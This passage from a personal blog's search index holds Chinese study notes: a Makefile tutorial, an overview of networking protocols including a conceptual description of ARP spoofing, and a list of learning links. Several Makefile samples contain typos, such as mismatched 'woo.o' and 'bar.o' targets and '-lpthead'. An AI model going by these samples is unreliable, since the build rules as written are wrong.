-lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>按照程序员的惯例，凡是要一次次重新执行的命令，都应该写成脚本。所以，简单来说，你会把上面这个命令序列写成一个build.sh，每次编译你只要执行这个脚本问题就解决了。</p><p>但这个脚本有问题，假设我修改了 foo.c，但我没有修改 bar.c 和main.c，那么执行这个脚本是很浪费的，因为它会无条件也重新编译 bar.c 和main.c。</p><p>这个脚本更合理的写法应该是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ foo.o -ot foo.c ] &amp;&amp; gcc -Wall -c foo.c -o foo.o</span><br><span class="line">[ bar.o -ot bar.c ] &amp;&amp; gcc -Wall -c bar.c -o bar.o</span><br><span class="line">[ main.o -ot main.o] &amp;&amp; gcc -Wall -c main.c -o main.o</span><br><span class="line">[ app.executable -ot main.o ] &amp;&amp; [ app.executable -ot foo.o ] &amp;&amp; [ app.executable -ot bar.o ] &amp;&amp; gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>如果你面对一个问题，不要尝试重新去定义这个问题，而是看它和原来的问题相比，多出来的问题是什么，尝试解决那个多出来的问题就好了。那么这里，多出来的问题就是文件修改时间比较。这个就是Makefile 要解决的基本问题了。我们定义一种新的“脚本语言”（只是不用sh/bash/tch 来解释，而是用 make来解释），可以用很简单的方法来说明我们需要做的文件比较。这样上面的脚本就可以写成这个样子了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample1</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  gcc -Wall -c foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  gcc -Wall -c bar.c -o woo.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  gcc -Wall -c main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>上面那个 Makefile 中，foo.o: foo.c定义了一个<strong>“依赖”</strong>，说明 foo.o 是靠 foo.c编译成的，它后面缩进的那些命令，就是简单的 shell脚本，称为<strong>规则(rule)</strong>。而 Makefile的作用是定义一组依赖，当被依赖的文件比依赖的文件新，就执行规则。这样，前面的问题就解决了。</p><p>IDE 中封装了 Makefile的使用，但想要具体控制特定文件的编译细节，最终仍然需要面对这些问题，IDE和 make 工具的对比，两者解决的是问题的不同层次。</p><p>Makefile 中的依赖定义构成了一个依赖链（树），比如上面这个 Makefile中，app.executable 依赖于 main.o，main.o 又依赖于main.c，所以，当你去满足app.executable（这个目标）的依赖的时候，它首先去检查 main.o的依赖，直到找到依赖树的叶子节点（main.c），然后进行时间比较。这个判断过程由make 工具来完成，所以，和一般的脚本不一样。Makefile的执行过程不是基于语句顺序的，而是基于依赖链的顺序的。<imgsrc="https://pic4.zhimg.com/80/v2-90371e6fcdf8f515a68dab7404ed4f43_1440w.jpg"alt="依赖树" /></p><h2 id="phony-依赖">phony 依赖</h2><p>make命令执行的时候，后面跟一个“目标”（不带参数的话默认是第一个依赖的目标），然后以这个目标为根建立整个依赖树。依赖树的每个节点是一个文件，任何时候我们都可以通过比较每个依赖文件和被依赖文件的时间，以决定是否需要执行“规则”</p><p>但有时，我们希望某个规则<strong>总是被执行</strong>。这时，很自然地，我们会定义一下<strong>永远都不会被满足</strong>的依赖。</p><p>可能会这么写：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">test:</span></span><br><span class="line">  DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>test 这个文件永远都不会被产生，所以，你只要执行这个依赖，rule是必然会被执行的。这种形式看起来很好用，但由于 make工具默认认为你这是个文件，当它成为依赖链的一部分的时候，很容易造成各种误会和处理误差。</p><p>所以，简化起见，Makefile允许你显式地把一个依赖目标定义为<strong>假的(Phony)</strong>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: test</span></span><br><span class="line"><span class="section">test:</span></span><br><span class="line"> DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>这样 make 工具就不用多想了，也不用检查 test 这个文件的时间了，反正test 就是假的，如果有人依赖它，无条件执行就对了。</p><h2 id="宏">宏</h2><p>前面的 sample1明显还是有很多多余的成份，这些多余的成份可以简单通过引入“宏”定义来解决，比如上面的Makefile，我们把重复的东西都用宏来写，就成了这样了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample2</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> bar.c -o bar.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> main.o foo.o bar.o -o app.executable</span><br></pre></td></tr></table></figure><p>还是有“多余”的成份在，因为明明依赖中已经写了 foo.o 了，rule中还要再写一次，我们可以把依赖的对象定义为 $@，被依赖的对象定义为$^（这是当前 gnumake 的设计），这样就可以进一步化简：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample3</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>很明显，这还是有重复，我们可以把重复的定义写成通配符：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"><span class="section">woo.o: woo.c</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>实际上，你要化简，还有很多手段，比如 gnumake 其实是默认定义了一组rule 的，上面这个整个你都可以不写，就这样就可以了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample5</span></span><br><span class="line">LDLIBS=-lpthead</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">OBJ=$(SRC:.c=.o)</span><br><span class="line"><span class="section">app.executable: <span class="variable">$(OBJ)</span></span></span><br><span class="line"><span class="comment">#看不懂</span></span><br></pre></td></tr></table></figure><p>这里其实没有定义 .o 到 .c 的依赖，但 gnumake 默认如果 .c 存在，.o就依赖对应的 .c，而 .o 到 .c 的 rule，是通过宏默认定义的。你只要修改CC，LDLIBS这类的宏，就能解决大部分问题了。所以你又省掉了一组定义，这就可以写得很短。</p><h2 id="头文件问题">头文件问题</h2><p>现在我们把问题搞得复杂一点，增加三个头文件。比如 foo.h、bar.h 和common.h，前两者定义 foo.c 和 bar.c 的对外接口，给 main.c 使用，common.h定义所有文件都要用到的通用定义（foo.h 和 woo.h 中包含common.h）。这样前面这个 sample1 就有毛病了。照理说，foo.h更新的时候，foo.o 和 main.o都需要重新编译，但根据那个定义，根本就没有这个比较。</p><p>我们的定义必须写成这个样子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4+</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br><span class="line"><span class="section">bar.o: bar.c bar.h common.h</span></span><br><span class="line"><span class="section">main.o: main.c foo.h bar.h common.h</span></span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>(注：这个例子我们在 .o.c 依赖的规则中使用了 $&lt; 宏，它和 $^的区别是，它不包括依赖列表中的所有文件，而仅仅是列表中的第一个文件）</p><p>这就又增加了复杂度了——头文件包含关系一变化，我就得更新这个 Makefile的定义。这带来了升级时的冗余工作。按我们前面考虑一样的策略，我们尝试在已有的名称空间上解决这个问题。Makefile已经可以定义依赖了，但我们不知道这个依赖本身。这个事情谁能解决？——把这个过程想一下——其实已经有人解决这个问题了，这个包含关系谁知道嘛？当然是编译器。编译器都已经用到那个头文件了，当然是它才知道这种包含关系是什么样的。比如gcc 本身直接就提供了 -M 系列参数，可以自动帮你生成依赖关系。比如你执行gcc -MM foo.c 就可以得到</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br></pre></td></tr></table></figure><blockquote><p>本文引自开头的链接，由于能力有限及需求不高，剩余的看的不是很懂，目前就到这里。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning </tag>
            
            <tag> CS Tools </tag>
            
            <tag> Makefile Basics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Computer Network Fundamentals</title>
      <link href="/zh/2022/06/13/Tools/Computer%20Network%20Fundamentals/"/>
      <url>/zh/2022/06/13/Tools/Computer%20Network%20Fundamentals/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念">基本概念</h1><h2 id="端点与会话">端点与会话</h2><p>端点是指网络中可以发送或接收数据的设备。两个端点之间的通信称为对话。## IP 地址 32位二进制数，通常以点分十进制表示，随着设备连接到不同的局域网而变化。部分由网络号组成，另一部分是主机号，由子网掩码决定。## 子网掩码 32 位二进制数，形式为 1111…0000。与 IP 地址直接进行 AND操作可以得到网络号，与反转的掩码和 IP 地址进行 AND 操作可以得到主机号。## MAC 地址 48 位二进制数每个主机的唯一标识符（出厂后保持不变），网络卡的物理地址，在局域网中与IP 地址有映射关系。网络卡通过比较数据包中的目标 MAC地址直接决定是否发送给操作系统。</p><p><strong>IP 和 MAC 之间的关系类似于邮寄地址和身份证号码 -邮寄地址可能会改变，但身份证号码永远不会改变。</strong></p><span id="more"></span><h2 id="问题既然我们有-ip-地址为什么还需要-mac-地址">问题：既然我们有 IP地址，为什么还需要 MAC 地址？</h2><p>IP地址相当于包裹上的收件人地址。快递员通过收件人地址将线路从起点连接到终点，然后通过不同区域之间的物流转运将包裹送到收件人手中。MAC 地址相当于包裹上的收件人姓名。MAC地址更多是为了确认对方的信息。就像包裹跨越几个城市到达你手中时，快递员需要确认收件人是否正确，然后才能将包裹交给你。例如，同班的学生（抽象为局域网）彼此都认识，因此沟通不需要依赖学号（在这里抽象为IP 地址），只需直接叫名字（MAC 地址）。</p><p>虽然有 IP 地址，但在局域网中并不工作，因为使用 ARP协议（地址解析协议）进行网络寻址，而在局域网中所有主机都是彼此可见的。（此外，局域网中的IP 地址最多用于作为主机接收数据包时判断是否为目标主机的标准，在 ARP广播解包时选择是否响应 ARP 回复）。</p><h2 id="网关">网关</h2><p>网关是连接一个网络与另一个网络的“门”。它是网络的检查点。例子包括交换机和路由器。网关也称为网络连接器和协议转换器。默认网关在网络层以上实现网络互连，是最复杂的网络互连设备，仅用于互连具有不同高级协议的网络。网关结构类似于路由器，区别在于互连层。网关可用于广域网和局域网的互连。</p><p>==注意：由于历史原因，许多 TCP/IP文献曾将用于网络层的路由器称为网关。如今许多局域网使用路由器进行网络接入，因此网关通常指路由器的IP==</p><h2 id="tcp-和-udp">TCP 和 UDP</h2><h3 id="udp">UDP</h3><p>互联网协议套件支持一种无连接的传输协议，称为用户数据报协议（UDP）。UDP为应用程序提供了一种发送封装的 IP 数据包而无需建立连接的方法。RFC 768描述了 UDP。 互联网传输层有两个主要协议，相辅相成。无连接的协议是UDP，几乎没有特别的功能，只是为应用程序提供数据包发送功能，并允许它们在所需级别上构建自己的协议。<strong>面向连接的</strong>协议是TCP，几乎做了所有事情。</p><h3 id="tcp更强大但也更复杂">TCP（更强大但也更复杂）</h3><p>传输控制协议（TCP）是一种面向连接、可靠的基于字节流的传输层通信协议，由IETF RFC 793 定义。 TCP旨在适应支持多网络应用的分层协议体系。连接到不同但互联的计算机通信网络的主机计算机中的配对进程依赖于TCP 提供可靠的通信服务。TCP假设它可以从较低级别的协议中获得简单的、可能不可靠的数据报服务。原则上，TCP应能够在从硬连线连接到分组交换或电路交换网络的各种通信系统上运行。</p><h4 id="连接建立与终止">连接建立与终止</h4><p><strong>连接建立：</strong> <imgsrc="https://pic2.zhimg.com/80/v2-58989b47296d51404a93456e33fb8bce_1440w.png"alt="image" /> <strong>连接终止：</strong> <imgsrc="https://pica.zhimg.com/80/v2-ef569f7a16193c4f5ec462900790a730_1440w.png"alt="image" /></p><h4 id="主要特征">主要特征</h4><p>TCP是一种面向广域网的通信协议，旨在在跨多个网络通信时提供具有以下特征的通信方法：* 基于流的方式； * 面向连接； * 可靠的通信方式； *在网络条件不佳时，最小化因重传造成的系统带宽开销； *通信连接维护面向通信的两个端点，而不考虑中间网络段和节点。</p><p>为了满足 TCP 协议的这些特征，TCP 协议做出了以下规定：①数据分片：在发送方对用户数据进行分片，在接收方进行重组，TCP确定分片大小并控制分片和重组；②到达确认：当接收方接收到分片数据时，根据分片数据序列号向发送方发送确认；③超时重传：发送方在发送分片时启动超时计时器，如果超时后未收到相应的确认，则重传该分片；④滑动窗口：TCP连接中每一方的接收缓冲区大小是固定的，接收方只允许另一方发送接收方缓冲区可以容纳的数据，TCP提供基于滑动窗口的流量控制，以防止较快的主机导致较慢的主机缓冲区溢出；⑤乱序处理：作为 IP 数据报传输的 TCP 分片可能会乱序到达，TCP会对接收到的数据进行重新排序，并以正确的顺序将接收到的数据交付给应用层；⑥重复处理：作为 IP 数据报传输的 TCP 分片会有重复，TCP接收方必须丢弃重复数据； ⑦数据校验和：TCP维护其头部和数据的校验和，这是一个端到端的校验和，旨在检测数据在传输过程中是否发生变化。如果接收到的分片的校验和有错误，TCP将丢弃该分片，并不确认接收该段，导致对方超时并重传。</p><h3 id="简单区分">简单区分</h3><p>互联网传输层有两个主要协议，相辅相成。无连接的协议是UDP，几乎没有特别的功能，只是为应用程序提供数据包发送功能，并允许它们在所需级别上构建自己的协议。面向连接的协议是TCP，几乎做了所有事情。</p><h2 id="dhcp-服务">DHCP 服务</h2><h3 id="dhcp-介绍">DHCP 介绍</h3><p><strong>DHCP</strong>（动态主机配置协议）是一种局域网协议。它指的是一个服务器控制一系列IP 地址，客户端机器在登录服务器时可以自动获取服务器分配的 IP地址和子网掩码。 通常应用于大型局域网环境，其主要功能是集中管理和分配 IP地址，使网络环境中的主机能够动态获取 IP 地址、网关地址、DNS服务器地址等信息，提高地址利用率。</p><p>DHCP协议使用客户端/服务器模型，动态主机地址分配任务由网络主机驱动。当 DHCP服务器接收到网络主机的地址申请信息时，它将相关地址配置发送给网络主机，以实现网络主机地址信息的动态配置。</p><h3 id="dhcp-功能">DHCP 功能</h3><p>DHCP 具有以下功能： 1. 确保任何 IP 地址在同一时间只能被一个 DHCP客户端使用。 2. DHCP 应能够为用户分配永久固定的 IP 地址。 3. DHCP应能够与通过其他方法获取 IP 地址的主机共存（例如手动配置 IP地址的主机）。 4. DHCP 服务器应为现有的 BOOTP 客户端提供服务。</p><h3 id="地址分配方法">地址分配方法</h3><p>DHCP 有三种分配 IP 地址的机制： 1) 自动分配：DHCP服务器为主机分配一个永久 IP 地址。一旦 DHCP 客户端首次成功租用 DHCP服务器的 IP 地址，它可以永久使用该地址。 2) 动态分配：DHCP服务器为主机分配一个有时间限制的 IP地址。当时间到期或主机明确放弃该地址时，该地址可以被其他主机使用。 3)手动分配：客户端的 IP 地址由网络管理员指定，DHCP服务器仅告知客户端主机指定的 IP 地址。在这三种地址分配方法中，只有动态分配可以重用客户端不再需要的地址。</p><h2 id="ftp">FTP</h2><h3 id="ftp-介绍">FTP 介绍</h3><p>文件传输协议（FTP）是一组用于网络文件传输的标准协议。它工作在 OSI模型的第七层，TCP 模型的第四层，即应用层，使用<strong>TCP 传输而不是UDP</strong>。客户端必须经过“三次握手”过程才能与服务器建立连接，以确保客户端与服务器之间的连接是可靠的，并且是面向连接的，为数据传输提供可靠保证。FTP允许用户通过文件操作（如文件添加、删除、修改、查询、传输等）与另一个主机进行通信。然而，用户并不实际登录到他们想要访问的计算机成为完全用户。FTP程序可以用来访问远程资源，实现用户的往返文件传输、目录管理和电子邮件访问等，即使两台计算机可能有不同的操作系统和文件存储方式。### 传输方法 FTP 有两种传输方法：ASCII 和二进制。 #### ASCII 传输方法假设正在复制的文件包含简单的 ASCII 文本，如果远程机器没有运行 UNIX，ftp通常会在文件传输过程中自动调整文件内容，以便以另一台计算机存储文本文件的格式解释文件。但通常会出现传输的文件不包含文本文件的情况，它们可能是程序、数据库、文字处理文件或压缩文件。在复制任何非文本文件之前，使用binary 命令告诉 ftp 按字符逐个复制。 #### 二进制传输模式在二进制传输中，文件的位顺序被保留，以便原始文件和副本逐位对应。即使目标机器上包含的位序列没有意义。例如，Macintosh将可执行文件以二进制模式传输到 Windows系统，而该文件无法在另一个系统上执行。如果以 ASCII模式传输二进制文件，即使不需要，翻译仍会发生。这将导致数据损坏。（ASCII模式通常假设每个字符的第一个有效位是无意义的，因为 ASCII字符组合不使用它。如果传输二进制文件，所有位都是重要的。）</p><h3 id="ftp-支持两种模式">FTP 支持两种模式</h3><p>FTP 客户端发起 FTP 会话并与 FTP 服务器建立相应的连接。在 FTP会话期间，需要建立两个连接：控制信息处理和数据处理。控制连接无法完成数据传输任务，仅用于传输FTP执行的内部命令和命令响应及其他控制信息；数据连接是服务器与客户端之间文件传输的连接，是全双工的，允许双向数据同时传输。当数据传输完成后，数据连接被撤销，返回到FTP 会话状态，直到控制连接被撤销，会话退出。 FTP支持两种模式：标准（PORT 模式，主动模式）、被动（PASV，被动模式）。 ####端口模式（主动模式） FTP 客户端首先与服务器的 TCP 端口 21建立连接以发送命令。当客户端需要接收数据时，它在此通道上发送 PORT命令。PORT命令包含客户端用于接收数据的端口。当传输数据时，服务器通过其自己的 TCP端口 20 连接到客户端指定的端口以发送数据。FTP服务器必须与客户端建立新的连接以进行数据传输。 #### 被动模式控制通道的建立与标准模式类似，但在建立连接后发送 Pasv 命令。在服务器收到Pasv 命令后，它打开一个临时端口（端口号大于 1023 且小于65535），并通知客户端请求在该端口上传输数据。客户端连接到 FTP服务器的该端口，然后 FTP 服务器通过该端口传输数据。</p><h4 id="注意">注意</h4><p>许多防火墙配置为不允许外部连接，因此许多位于防火墙后面或内部网络上的FTP 服务器不支持 PASV 模式，因为客户端无法通过防火墙打开 FTP服务器的高端口；而许多内部网络客户端无法使用 PORT 模式登录 FTP服务器，因为服务器的 TCP 20无法与内部网络上的客户端建立新的连接，导致无法工作。</p><h2 id="http">HTTP</h2><p>超文本传输协议（HTTP）是一种简单的请求-响应协议，通常在 TCP之上运行。请求和响应消息头以 ASCII 形式给出。 ### 应用场景 HTTP最初诞生时，主要用于 WEB内容检索。那时，内容没有现在丰富，布局也不够美观，用户交互场景几乎不存在。对于这个简单的WEB 内容检索场景，HTTP 表现得相当不错。但随着互联网的发展和 WEB2.0的诞生，更多的内容开始被展示（更多的图像文件），布局变得更加美观（更多的CSS），并引入了更复杂的交互（更多的JS）。用户打开网站主页时加载的数据总量和请求数量也在不断增加。 ###消息格式 HTTP 消息由客户端到服务器的请求和服务器到客户端的响应组成。</p><h4 id="请求消息">请求消息</h4><p>请求消息格式如下：</p><p>请求行 - 一般信息头 - 请求头 - 实体头 - 消息体</p><p>请求行以方法字段开头，后跟 URL 字段和 HTTP 协议版本字段，以 CRLF结束。SP 是分隔符。除了 CF 和 LF 在最终 CRLF序列中是必需的，其他都是可选的。有关一般信息头、请求头和实体头的具体内容，请参阅相关文档。</p><h4 id="响应消息">响应消息</h4><p>响应消息格式如下：</p><p>状态行 - 一般信息头 - 响应头 - 实体头 - 消息体</p><p>状态码由 3位数字组成，指示请求是否被理解或满足。原因分析是对原始状态码的简要描述。状态码用于支持自动操作，而原因分析则供用户使用。客户端无需检查或显示语法。有关一般信息头、响应头和实体头的具体内容，请参阅相关文档。</p><p><strong><ahref="https://blog.csdn.net/m0_45861545/article/details/120835738">详细的HTTP 消息解释点击这里</a></strong></p><h3 id="状态码">状态码</h3><p>服务器接收到 HTTP请求后，将响应信息发送给客户端，放在第一行。最重要的部分是状态码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h4 id="状态码类型---第一位数字">状态码类型 - 第一位数字</h4><ul><li>1**：请求成功接收，继续处理；范围 100~101</li><li>2**：服务器成功处理请求；范围 200~206</li><li>3**：访问的资源已移动，通知客户端重新发送新请求；范围 300~305</li><li>4**：客户端错误，服务器无法处理请求，例如访问的资源不存在；范围400~415</li><li>5**：服务器错误；范围 500~505</li></ul><h4 id="常见-http-状态码">常见 HTTP 状态码</h4><ul><li>200：客户端请求成功（常见）</li><li>302：重定向</li><li>404：请求的资源不存在（常见）</li><li>400：客户端请求语法错误，服务器无法理解</li><li>401：访问未授权</li><li>403：服务器收到请求但拒绝服务</li><li>500：服务器内部错误（常见）</li><li>503：服务器当前无法处理，可能过一段时间后可以处理</li></ul><p>具体细节请参见“<strong>图解 HTTP</strong>”</p><h1 id="通信">通信</h1><h2 id="内部网络通信局域网">内部网络通信（局域网）</h2><h3 id="以太网">以太网</h3><p>以太网是一种计算机<strong>局域网</strong>技术。</p><h3 id="内部网络通信过程">内部网络通信过程</h3><p>这里提到的内部网络通常指局域网（LAN）。当我们说两个终端在同一内部网络时，实际上是指两个终端的网络号相同。如果两个终端在同一内部网络，它们的通信方式如下</p><figure><imgsrc="https://pic3.zhimg.com/80/v2-28645c18e711eac7b6a3262f94556ecc_1440w.png"alt="image" /><figcaption aria-hidden="true">image</figcaption></figure><h3 id="arp-介绍">ARP 介绍</h3><h4 id="arp-协议">ARP 协议</h4><p>地址解析协议（ARP）是一个 TCP/IP 协议，用于根据 IP地址获取物理地址。当主机发送信息时，它向局域网中的所有主机广播包含目标IP 地址的 ARP请求，并接收返回消息以确定目标的物理地址；在接收到返回消息后，它将 IP地址和物理地址存储在本地 ARP缓存中，并保留一段时间，下一次请求直接查询<strong>ARP缓存</strong>以节省资源。地址解析协议基于网络中主机之间的相互信任。局域网中的主机可以自主发送ARP 回复消息，其他主机在接收到时会将其记录在本地 ARP缓存中，而不检测回复消息的真实性；因此攻击者可以向某个主机发送伪造的 ARP回复消息，使得发送的信息无法到达预期主机或到达错误主机，构成 ARP欺骗。ARP 命令可用于查询本地 ARP 缓存中 IP 地址与 MAC地址的对应关系，添加或删除静态对应关系等。相关协议包括 RARP 和代理ARP。NDP 用于在 IPv6 中替代地址解析协议。</p><h4 id="arp-欺骗">ARP 欺骗</h4><p>ARP 欺骗，也称为 ARP 中毒（在网络上常翻译为 ARP 病毒）或 ARP攻击，是一种针对以太网地址解析协议（ARP）的攻击技术。通过伪造局域网中访客PC 的网关 MAC 地址，使访客 PC 错误地认为攻击者更改的 MAC 地址是网关的MAC，导致网络故障。这种攻击允许攻击者获取局域网中的数据包，甚至篡改数据包，并可能使特定计算机或网络上的所有计算机无法正常连接。</p><h4 id="免费-arp">免费 ARP</h4><ol type="1"><li>检查地址冲突</li><li>更新自己的 ARP 缓存</li></ol><h2 id="互联网通信过程">互联网通信过程</h2><p>如果主机在互联网上，目标地址和源地址不在同一内部网络，意味着它们的 IP地址的网络号部分不一致。这时，数据包需要发送到“默认网关”进行路由。具体通信过程如下：</p><figure><imgsrc="https://pic4.zhimg.com/80/v2-5188517210eac6afb96e4046cbbe65c6_1440w.png"alt="image" /><figcaption aria-hidden="true">image</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>useful_links</title>
      <link href="/zh/2022/05/25/Blog/useful-links/"/>
      <url>/zh/2022/05/25/Blog/useful-links/</url>
      
        <content type="html"><![CDATA[<p>书籍资源: https://github.com/frankcbliu/CS-Books-PDF</p><p>算法知识解释: https://oi-wiki.org/graph/</p><p>计算机自学指南: https://csdiy.wiki</p><p>学堂在线（类似于MOOC课程网站）:</p><p>https://www.xuetangx.com（强烈推荐清华大学郑莉教授的C++编程课程）</p><span id="more"></span><p>计算机实用技术（学堂在线）:https://www.xuetangx.com/learn/THUSAST08091234567890/THUSAST08091234567890/8571842/video/13167559</p><p>邓俊辉的数据结构（学堂在线）:https://www.xuetangx.com/learn/THU08091000384/THU08091000384/10322765/video/17436706?channel=i.area.manual_search</p><p>在线编码学习网站:</p><p>https://www.freecodecamp.org/ https://www.codecademy.com/learn</p><p>清华大学研究生入学考试资料:https://github.com/Wsky51/THU-CS912-kaoyan</p><p>GitHub配置Hexo个人博客搭建: https://zhuanlan.zhihu.com/p/60578464https://zhuanlan.zhihu.com/p/36912355?utm_source=wechat_session&amp;utm_medium=social&amp;s_r=0</p><p>清华大学高级OOP笔记 https://c7w.tech/oop-note/</p><p>清华大学高级笔记:https://cloud.tsinghua.edu.cn/d/598bef9e3b844f17bf59/</p><p>Linux学习笔记: https://zq99299.github.io/linux-tutorial/</p><p>Vim编辑器配置插件:</p><p>MIT Vim讲座: https://missing.csail.mit.edu/2020/editors/（包含老师的配置）</p><p>插件搜索网站: https://vimawesome.com</p><p>超级强大的Vim配置（vimplus）- 续集:https://www.cnblogs.com/highway-9/p/5984285.html</p><p>iTerm2 + zsh + oh-my-zsh美化:</p><p>教程: https://zhuanlan.zhihu.com/p/145437836</p><p>图标: https://www.nerdfonts.com/cheat-sheet</p>]]></content>
      
      
      <categories>
          
          <category> 学习资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
